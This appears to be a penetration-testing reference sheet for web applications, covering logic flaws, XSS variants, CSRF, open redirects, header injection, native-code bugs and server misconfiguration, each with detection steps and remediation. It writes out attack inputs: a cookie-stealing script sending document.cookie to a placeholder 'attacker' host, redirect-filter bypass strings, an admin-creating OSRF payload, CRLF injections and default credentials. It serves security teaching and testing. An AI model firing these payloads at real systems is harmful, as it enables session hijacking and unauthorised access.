- **remediation**: Don't pass input to file APIs (use index into a hardcoded list); after decode+canonicalize, reject `../`/`..\`/null bytes; whitelist file types; verify canonical path starts with the base dir (Java `getCanonicalPath`, .NET `Path.GetFullPath`); chroot; log+alert.
- **tools**: FileMon/ltrace/strace/truss (local), Burp Intruder (illegal-unicode payloads).

### === APPLICATION LOGIC ===

#### logic-flaws
- **name**: Application logic flaws
- **what**: Defective developer assumptions (no common signature). Common examples: presence/absence of a param signals admin (password-change bypass); forced browsing past unpaid checkout stage; submitting params out-of-sequence to a shared handler (bypass validation, set arbitrary price, self-approve); reusing a stateful object across contexts (identity confusion); deleting audit trail + creating helper accounts; beating numeric limits with negatives; removing items after a bulk discount; forgetting to escape the escape char; search-function inference of protected content; static (non-session) storage leaking other users' data (debug messages / race conditions).
- **where-it-lives**: Multistage processes, security functions, trust-boundary transitions, price/quantity/limit checks, shared handlers, audit/dual-authorization, error/debug output.
- **how-to-detect / test**:
  - Remove each param (name AND value, not just value), one at a time, follow multistage to completion.
  - Forced browsing: submit stages out of order, skip, repeat, access later stages first.
  - Submit a param from one stage at a different stage; submit one user's param as another user.
  - Try negative numbers against limits; chain transactions to accrue state; manipulate discount timing.
  - Backslash-before-metachar to test escape-the-escape.
  - Search functions: infer protected content via match counts.
  - Two parallel users to detect static-storage leakage / race conditions (login, password change, funds transfer — scripted, high-spec, multiple IPs).
- **remediation**: Document every assumption; comment component assumptions & callers; think laterally in reviews about unexpected input and side effects; drive identity/privilege from session; per-session/per-thread storage (never static for user data); escape the escape char; reject negatives; finalize orders before discounts.
- **tools**: Burp Repeater/Intruder; manual + lateral thinking.

### === ATTACKING OTHER USERS ===

#### reflected-xss
- **name**: Reflected (first-order) cross-site scripting
- **what**: User input echoed unsanitized into the response; script runs in victim's context (session theft, etc.). ~75% of XSS.
- **where-it-lives**: Error-message pages (`?message=`), search echoes, any reflected param — body, or attribute/existing-script contexts.
- **how-to-detect**: Fuzz with `xsstest` (payload-reflection grep) and `"><script>alert('xss')</script>`; find reflection location, review surrounding HTML for injection method.
- **how-to-exploit / test**: `?message=<script>var i=new Image;i.src="http://attacker/"+document.cookie;</script>` steals cookies (works cross-site because browser treats it as from the vulnerable origin). POST-only XSS still exploitable via auto-submitting attacker form; convert to GET if possible for wider delivery. Filter bypass: consult a current XSS filter-evasion cheat sheet, inject into existing JS/event handlers (no `<script>` needed), change encoding.
- **remediation**: Validate input (length/charset/regex) AND HTML-encode output (`" &quot; ' &apos; & &amp; < &lt; > &gt;`, or encode all non-alphanumeric) — output encoding is mandatory. Eliminate dangerous insertion points (don't put input into existing JS or JS-executable attributes). Fix encoding-type manipulation; set explicit charset.
- **tools**: Burp Intruder (Payload Grep), a browser to confirm.

#### stored-xss
- **name**: Stored (second-order) cross-site scripting
- **what**: Malicious input persisted and served to other users later (incl. via out-of-band channels and uploaded files).
- **where-it-lives**: Anywhere user data is stored and re-displayed; admin views of user data (→ privilege escalation); file upload (HTML/text/JPEG rendered in-browser).
- **how-to-detect**: After fuzzing the whole app, watch for your strings appearing in responses to unrelated requests; complete multistage stores manually; test each file type the app accepts.
- **how-to-exploit / test**: Session hijack / request forgery against other users, especially admins. Can defeat anti-XSRF (JS reads token from same response).
- **remediation**: Same as reflected (input validation + output encoding); validate uploaded file content/type.

#### dom-based-xss
- **name**: DOM-based XSS
- **what**: Client JS reads DOM data (URL) and writes it to the page unsafely — server may never see/return the payload.
- **where-it-lives**: Sources `document.location/URL/URLUnencoded/referrer`, `window.location`; sinks `document.write/writeln`, `innerHTML`, `eval`, `execScript`, `setInterval/setTimeout`. In any page with JS (static or dynamic).
- **how-to-detect**: Review all client JS for source→sink flows; use FireBug to trace. Standard alert probe often misses it (syntax-dependent).
- **how-to-exploit / test**: Evade server filters: put payload in an invented param after the vulnerable one, or after `#` (fragment not sent to server) — `?message=ok#<script>alert(document.cookie)</script>`.
- **remediation**: Avoid client-side DOM→page insertion; validate input client-side (regex whitelist) + defense-in-depth server-side; HTML-encode via `createTextNode`.
- **tools**: FireBug/browser debugger.

#### xst
- **name**: Cross-site tracing (XST)
- **what**: Use TRACE method (via injected JS) to read HttpOnly cookies. Browsers now block TRACE via XHR — largely historical.
- **how-to-detect**: `OPTIONS` shows TRACE; requires an XSS foothold.
- **remediation**: Fix XSS, flag cookies HttpOnly, disable TRACE on the server.

#### open-redirection
- **name**: Redirection (open redirect) attacks
- **what**: User-controlled redirect target → phishing credibility (authentic-looking URL bounces to attacker).
- **where-it-lives**: HTTP 3xx `Location`, `Refresh` header, `<meta refresh>`, JS `document.location`/`window.location`/`window.open`; post-login `returnURL`.
- **how-to-detect**: Find redirects (proxy, page-vs-resource requests); modify absolute domain / turn relative into absolute; confirm 302 to external domain.
- **how-to-exploit / test**: Bypass filters: `HtTp://`, `%00http://`, leading-space, `//attacker.com`, encoded/double-encoded, `http://http://attacker`, `hthttp://tp://attacker`, `http://app.com.attacker.com`, `http://attacker/?http://app.com`; prefix without trailing slash → `?target=.attacker.com`.
- **remediation**: Don't put input in redirect targets (use index into a list); else validate strictly relative or that it begins with your domain; reject not sanitize.

#### http-header-injection
- **name**: HTTP header injection & response splitting
- **what**: Newlines (`%0d%0a`) in a value reflected into a header → inject headers / split the response (cookie injection, cache poisoning).
- **where-it-lives**: `Location`, `Set-Cookie`, any header built from input.
- **how-to-detect**: Send `%0d%0a`-containing input; look for the actual newline (extra header line) in the response, not the encoded form. Bypasses: `foo%00%0d%0abar`, `foo%250d%250abar`, `foo%%0d0d%%0a0abar`.
- **how-to-exploit / test**: Inject `Set-Cookie` (session fixation); response splitting to poison a proxy cache with a Trojan page (pipelined requests).
- **remediation**: Don't put input in headers; validate (charset, length); reject any char < 0x20; HTTPS to prevent cache poisoning.

#### frame-injection
- **name**: Frame injection
- **what**: Named frames writable cross-window → overwrite a frame with Trojan content while URL/padlock stay genuine. Modern browsers extend same-origin to named frames — largely historical.
- **where-it-lives**: `<frame name="main_display">`.
- **how-to-detect**: Frameset with static `name` attrs; if names are random/change per session, likely safe.
- **remediation**: Anonymous frames, or session-unique unpredictable frame names.

#### osrf
- **name**: On-site request forgery (OSRF)
- **what**: Stored input forms an on-site link/`<img src>` target → viewers make attacker-chosen on-site GET (even without XSS, even JS disabled).
- **where-it-lives**: Stored data placed into a URL/`<img>` target (e.g. message board `type` param → `<img src="/images/question.gif">`).
- **how-to-detect / test**: Where user data goes into a hyperlink/URL and `/ . \ ? & =` aren't blocked. Inject `../admin/newUser.php?username=x&password=y&role=admin#` — executes when an admin views it.
- **remediation**: Strict input validation (block `/ . \ ? & =`); HTML-encoding does NOT help (browser decodes before requesting).

#### csrf
- **name**: Cross-site request forgery (XSRF)
- **what**: Attacker page triggers a state-changing request to the app using the victim's auto-sent cookies; "one-way" (can't read response).
- **where-it-lives**: Sensitive actions whose params an attacker can fully predetermine (no token/nonce); apps relying solely on cookies for session.
- **how-to-detect / test**: Find a sensitive request with no unpredictable params; build an HTML page that auto-issues it (`<img>` for GET, auto-submit form for POST); load while logged in; verify action occurred.
- **how-to-exploit / test**: TOCTOU trick: host an image that later 302-redirects to the CSRF URL.
- **remediation**: Anti-CSRF tokens in hidden fields (not just cookies); reauth/two-step for critical actions with a per-request nonce; do NOT rely on Referer (spoofable). Note: stored XSS or a reflected XSS in an undefended function can defeat CSRF tokens. Modern defenses: SameSite cookies + synchronizer/double-submit tokens.

#### json-hijacking
- **name**: JSON hijacking
- **what**: Cross-domain `<script src>` includes a JSON array/callback response; attacker overrides `Array`/`Object` constructor or defines the callback to steal the data (violates one-way CSRF). Modern browsers/JSON no longer allow constructor override — largely historical.
- **where-it-lives**: Ajax endpoints returning bare JSON arrays or `callback([...])`.
- **how-to-detect / test**: Cross-domain request with no unpredictable params; if the app's own request is POST, check it still works as GET; then include via `<script>` with overridden `Array()` or defined callback.
- **remediation**: Require unpredictable token; prevent GET; don't return sensitive data as executable JS (prefix with `while(1);`/`for(;;);` or wrap in comments).

#### session-fixation
- **name**: Session fixation
- **what**: App accepts an attacker-set token and doesn't reissue at login → attacker fixes a victim's token then hijacks the authenticated session.
- **where-it-lives**: Token issued pre-auth and reused post-auth; tokens accepted from URL; sensitive sessionless flows.
- **how-to-detect / test**: Obtain a token unauthenticated, log in — if no fresh token issued, vulnerable. Or set an invented validly-formed token and log in. Also test sessionless sensitive-data flows (order verify pages).
- **remediation**: Always issue a fresh session at successful authentication; don't accept tokens from URL.

#### activex-attacks / local-privacy / browser-exploitation
- **name**: ActiveX control vulns; local privacy; browser exploitation frameworks
- **what**: Exploitable methods in installed ActiveX controls (dangerous method names like `LaunchExe`, buffer overflows); local data leakage via persistent cookies, cached HTTPS content over HTTP, browsing history, autocomplete; XSS-delivered hooks (BeEF/XSS Shell) → keylogging, clipboard, port scan, history theft.
- **how-to-detect / test**: COMRaider to enumerate/fuzz control methods; feed arbitrary data via HTML. Review persistent `Set-Cookie` (future `expires`) for sensitive data; check missing `Expires:0`/`Cache-control:no-cache`/`Pragma:no-cache` on sensitive HTTP pages; check `autocomplete=off` on sensitive forms; sensitive data in URL params → browser history.
- **remediation**: Safe-for-scripting only when truly safe; no persistent sensitive cookies; cache/autocomplete directives; no sensitive data in URLs.
- **tools**: COMRaider, BeEF, XSS Shell.

### === AUTOMATION ===

#### bespoke-automation
- **name**: Automating bespoke attacks
- **what**: Three uses — enumerate identifiers, harvest data, fuzz for vulnerabilities. Human intelligence + computer brute force.
- **how-to-detect (hit indicators)**: HTTP status code, response length, response-body strings/patterns, `Location` header, `Set-Cookie`, time delays. Response length is a strong anomaly indicator even when another discriminator is reliable.
- **how-to-exploit / test**: Find a request/response pair that varies systematically with a param; iterate a wordlist or syntactic range; grep responses. Fuzz every param one-at-a-time (leave others valid) with the universal payload set; sort results by status/length/time/grep to find anomalies; send interesting cases to Repeater for manual confirmation.
- **tools**: Burp Intruder (sniper/cluster-bomb/battering-ram; payload types: lists, custom iterator, char/case substitution, numbers, dates, illegal-unicode, char-blocks, brute-forcer; Extract Grep, Recursive Grep, Payload Grep), custom scripts (bash/curl/netcat, Java/C#/Python), Wget, Curl, Stunnel.

### === INFORMATION DISCLOSURE ===

#### information-disclosure
- **name**: Exploiting information disclosure
- **what**: Error messages (script errors w/ line numbers, stack traces, verbose debug dumps of session/creds/paths, DB/ODBC errors), published data (usernames, masked-but-present passwords, logs, HTML comments), and inference (timing, username enumeration, blind-injection bit extraction).
- **where-it-lives**: 500 responses, unhandled exceptions, debug pages (`phpinfo.php`), logs, client-side comments/thick-client components.
- **how-to-detect / test**: Grep every response for `error exception illegal invalid fail stack access directory file not found varchar ODBC SQL SELECT`. Search unusual messages on Google / Google Code (`"unable to retrieve" filetype:php`, `lang:php package:mail`). Engineer errors to extract data (ODBC cast errors; Java UDF throwing an exception containing command output). Timing inference: cache/lazy-load (dormant vs active account), valid-username processing, load-balancer host probing.
- **remediation**: Generic error messages (customErrors/web.xml/IIS custom errors/Apache ErrorDocument); protect sensitive data behind access control; truncate stored card numbers; never prefill passwords; strip banners (URLScan/IISLockDown, mod_headers) and client comments; no secrets in thick clients.
- **tools**: Burp Intruder (Grep, response timing), search engines.

### === COMPILED / NATIVE CODE ===

> WARNING: even *probing* these commonly crashes the app (DoS). Get owner consent.

#### buffer-overflow
- **name**: Buffer overflow (stack / heap / off-by-one)
- **what**: Copy of user data into an undersized buffer overwrites adjacent memory (return address / heap control structs / null terminator loss). Prevalent in web apps on hardware devices (printers/switches) and native components.
- **where-it-lives**: `dll`/`exe` pages, legacy/native components, logging. Fixed buffers of round sizes (32/100/1024/4096).
- **how-to-detect / test**: Send long strings just over common sizes: 1100, 4200, 33000 (Burp char-blocks). One item at a time. Anomalies: 500/native error, partial/malformed response, abrupt TCP close, whole app stops, or off-by-one → unexpected data (lost null terminator, e.g. a CGI leaking prior users' data). Heap crashes may be delayed. Respect URL-length filters (~2000) and per-field charset filters — extend existing valid data.
- **remediation**: (developer) bounded copies with room for null terminator; compiler/OS defenses. ASLR/DEP/stack canaries make exploitation harder.
- **tools**: Burp Intruder (char blocks).

#### integer-vulnerabilities
- **name**: Integer overflow / signedness errors
- **what**: Arithmetic on a length wraps (65535+1→0) or signed/unsigned confusion (negative → huge) → undersized allocation → overflow.
- **how-to-detect / test**: Send boundary values (little- and big-endian): `0x7f/0x80`, `0xff/0x100`, `0x7fff/0x8000`, `0xffff/0x10000`, `0x7fffffff/0x80000000`, `0xffffffff/0x0`. Watch for overflow anomalies.

#### format-string
- **name**: Format string vulnerability
- **what**: User-controlled format string in `printf`/`FormatMessage` → memory read/write, code exec (`%n`).
- **how-to-detect / test**: Send `%n%n%n...` and `%s%s%s...` (and Windows `%1!n!%2!n!...` / `%1!s!...`); URL-encode `%` as `%25`; watch for crashes. `%s` dereferences stack even when `%n` is disabled.

### === APPLICATION ARCHITECTURE ===

#### tier-trust-and-segregation
- **name**: Tiered-architecture trust / segregation flaws
- **what**: Tiers over-trust each other (app tier does all access control; DB honors all app queries; OS runs app with high privilege) and are poorly segregated (LAMP single-host: file-read flaw → read MySQL data files directly, undercutting DB access control; command exec on one tier → attack others / dual-homed hosts / internal network).
- **how-to-detect / test**: Trace how a limited flaw escalates: SQLi → all app data (single DB account); path traversal → read DB files; command exec → pivot/scan internal hosts. Audit which OS/DB accounts each tier uses.
- **remediation**: Minimize trust (per-tier controls: app-server URL roles, per-user/least-priv DB accounts, least-priv OS accounts); segregate (no cross-tier file access, network-filter between tiers); defense-in-depth (harden every layer, encrypt persisted secrets, protect DB connection strings).

#### shared-hosting
- **name**: Shared hosting / ASP environment flaws
- **what**: Multi-customer infra: insecure remote-access (FTP cleartext, over-liberal shells, poor DB segregation); deliberate backdoors (uploaded command-shell scripts running as the shared web-server user); attacks between vulnerable apps (one app's SQLi/traversal/command-exec compromises all); ASP shared-component attacks (XSS into shared logs viewed by privileged users; SQLi in shared definer-privilege stored procs).
- **how-to-detect / test**: Examine remote-access protocol/segregation; can you get an interactive shell or reach others' files/DB? If you can execute commands / SQLi / file-access in one app, probe escalation to others. Audit any shared DB (NGSSquirrel). `phpinfo()` to check safe_mode (note: not fully effective, removed in PHP 6).
- **remediation**: Robust authenticated encrypted remote access; least-privilege per-customer (separate OS accounts, DB instances, doc roots); trust boundaries between shared and customized ASP components.
- **tools**: NGSSquirrel, `phpinfo()`.

### === WEB SERVER ===

#### web-server-default-credentials-content
- **name**: Default credentials & default content
- **what**: Admin interfaces with well-known default creds (Tomcat admin/(none), tomcat/tomcat, root/root; JavaServer admin/admin; etc.); default debug/sample/powerful content (`phpinfo.php`, IIS `CodeBrws.asp`, Tomcat Sessions Example, Oracle PL/SQL gateway `SYS.OWA_UTIL.CELLSPRINT`).
- **how-to-detect / test**: Port-scan for admin interfaces on alt ports (8080/8443); try default creds (cirt.net, phenoelit.de lists); Nikto for default content; local-install to review sample scripts.
- **remediation**: Change/remove default creds; block admin interfaces (ACL/firewall); remove default content; harden retained functionality.
- **tools**: Nikto, port scanner.

#### dangerous-http-methods
- **name**: Dangerous HTTP methods (WebDAV)
- **what**: `PUT` (upload script → RCE), `DELETE`, `COPY`, `MOVE`, `SEARCH`, `PROPFIND`, `TRACE`.
- **how-to-detect / test**: `OPTIONS /` → `Allow`/`Public` headers; try each method manually (advertised ≠ usable, and vice versa). Confirm PUT: `PUT /test.txt` with body → 201 Created.
- **remediation**: Disable all methods except those used (typically GET/POST).
- **tools**: Paros (tests PUT per directory), WebDAV clients.

#### directory-listings
- **name**: Directory listings
- **what**: Server returns directory contents → exposes unlinked sensitive files (logs, backups, old scripts) relied on by broken access control.
- **how-to-detect / test**: Request each directory; note listings. Also historic server bugs (IIS 5 WebDAV SEARCH, JRun `%3f.jsp`).
- **remediation**: Disable listings server-wide; place index files.

#### web-server-as-proxy
- **name**: Web server used as an open proxy
- **what**: Forward-proxy misconfig → attack third parties, reach internal hosts, port-scan, loop back to localhost services.
- **how-to-detect / test**: `GET http://otherhost:80/ HTTP/1.0` (verify content isn't from the original server); `CONNECT otherhost:443` (200 Connection established). Scan internal IPs/ports and localhost (127.0.0.1) via both techniques; interpret 502/200/banner responses.
- **remediation**: Disable proxying; if required, restrict allowed hosts/ports + network filtering.

#### virtual-hosting-misconfig
- **name**: Misconfigured virtual hosting
- **what**: Security config applied only to a named vhost; default host bypasses it.
- **how-to-detect / test**: `GET /` with: correct Host, bogus Host, IP-in-Host, no Host (HTTP/1.0). Compare — IP-in-Host often yields directory listings / different default content. Re-map with the deviant Host; `nikto -vhost`.
- **remediation**: Apply hardening to the default host too.
- **tools**: Nikto (-vhost).

#### web-server-software-bugs
- **name**: Web server software vulnerabilities
- **what**: Buffer overflows (IIS ISAPI, Apache chunked-encoding, IIS WebDAV, iPlanet search), path traversal (Accipiter, Alibaba, Cisco ACS, McAfee EPO), encoding/canonicalization (JRun `%3f.jsp`; IIS Unicode `..%c0%af..` and double-encode `..%255c..`; Oracle PL/SQL Exclusion List bypasses: leading `%0A`whitespace, `S%FFS`, `"SYS"`, `<<FOO>>SYS`).
- **how-to-detect / test**: Nessus/Typhon/ISS scan; research exact version on Bugtraq/Full Disclosure/SecurityFocus; watch for bundled open-source servers (Apache/Jetty) that lag on patches and have modified banners; local-install to find new bugs.
- **remediation**: Choose software with a good track record; apply vendor patches promptly; harden (disable unused ISAPI/modules, rename, least-priv, chroot); monitor advisories; defense-in-depth (network filters, IDS, restricted DB/log access).
- **tools**: Nessus, Typhon, ISS, Httprint.

#### weak-ssl-ciphers
- **name**: Weak SSL/TLS ciphers & protocols
- **what**: App supports weak/obsolete ciphers → downgrade/decryption by a positioned attacker.
- **how-to-detect / test**: THCSSLCheck to list ciphers/protocols; beware false positives (server may advertise but refuse handshake — confirm with Opera forcing weak protocols).
- **remediation**: Disable weak ciphers/protocols.
- **tools**: THCSSLCheck, Opera. Use testssl.sh / sslyze; disable SSLv3/TLS1.0/RC4/export ciphers.

### === SOURCE CODE REVIEW ===

#### source-code-signatures
- **name**: Finding vulnerabilities in source code
- **what**: White-box review complements black-box. Methodology: (1) trace user-controlled data from entry points; (2) grep for vulnerability signatures; (3) line-by-line review of risky code (auth, session, access control, global input validation, external interfaces, native code).
- **where-it-lives / signatures**:
  - XSS: input concatenated into HTML/HREF/`<title>`; response built from request params.
  - SQLi: string concatenation with SQL keywords — grep `"SELECT "SELECT "INSERT "DELETE " AND " OR " WHERE " ORDER BY` (case-insensitive).
  - Path traversal: user data appended to a path and passed to file APIs.
  - Arbitrary redirect: input → redirect target; client JS `document.location = unescape(...)` (canonicalize-after-validate).
  - OS command injection: input → `system()`/`Runtime.exec`/`snprintf(...sendmail...)`.
  - Backdoor passwords: literal password compared in credential logic; unreferenced functions; hidden debug params.
  - Native: unchecked `strcpy/strcat/memcpy/sprintf`; misused `strncpy` (no room for null); signed/unsigned comparisons; user-controlled format strings in `printf/fprintf/FormatMessage`.
  - Comments: grep `bug problem bad hope todo fix overflow crash inject xss trust`.
- **per-language cheat sheet (entry points / dangerous APIs / config)**:
  - **Java**: input via `HttpServletRequest.getParameter*/getQueryString/getHeader*/getCookies/getInputStream/getReader/getRemoteUser`; session `HttpSession.setAttribute/getAttribute`; file `java.io.File`, `FileInputStream/Reader/Writer`; DB unsafe `Statement.execute/executeQuery` vs safe `PreparedStatement.setString/...`; OS `Runtime.exec` (no shell metachar interpretation, but arg-injection possible); redirect `HttpServletResponse.sendRedirect`.
  - **ASP.NET / PHP / Perl**: analogous — see the corresponding sections for `Request`, session, file, DB, dynamic-exec, OS-exec, redirect, socket APIs. PHP config: register_globals, safe_mode (weak, removed v6), magic_quotes.
- **remediation**: parameterized queries, safe APIs, output encoding, whitelist validation — as per each vuln class above.
- **tools**: grep, IDE refactoring (for obfuscated decompiled code), code-browsing tools.

---

## TOOLKIT
- **Intercepting proxies / suites**: Burp Suite (Proxy, Spider, Intruder, Repeater, ViewState decoder), WebScarab, Paros.
- **Alternatives**: TamperData, TamperIE.
- **Spidering**: Burp Spider, WebScarab (prefer user-directed spidering over automated — handles auth, avoids dangerous links, follows complex nav).
- **Scanners**: Nikto (default content), Nessus/Typhon/ISS (web-server bugs). Note: scanners find syntactic signatures, miss logic/access-control/subtle bugs — no full-auto tool is sufficient.
- **Fingerprinting**: Httprint (defeats banner spoofing).
- **Thick-client**: Jad/Jode/JSwat, .NET Reflector, OllyDbg, COMRaider, Filemon/Regmon, Flasm/Flare, Microsoft Detours.
- **SQLi**: sqlmap, Absinthe. **Randomness**: Stompy, WebScarab cookie analyzer. **Password**: Hydra. **Misc**: Wget, Curl, Netcat, Stunnel, THCSSLCheck, Wireshark, FireBug.

## KEY CROSS-CUTTING PRINCIPLES
- Look EVERYWHERE — auth flaws recur in registration/change/recover/impersonate; access-control checks must exist on every function AND every stage.
- Canonicalize-after-validate is a recurring bypass root cause. Apply filters after all decoding; don't decode afterward.
- Boundary validation over single-frontier validation; validate at each component's trust boundary.
- Output encoding (XSS) and parameterized queries (SQLi) are the mandatory primary defenses; input validation is a secondary failover.
- A limited flaw + trust relationships + undercut controls = full compromise; always think about escalation and chaining.
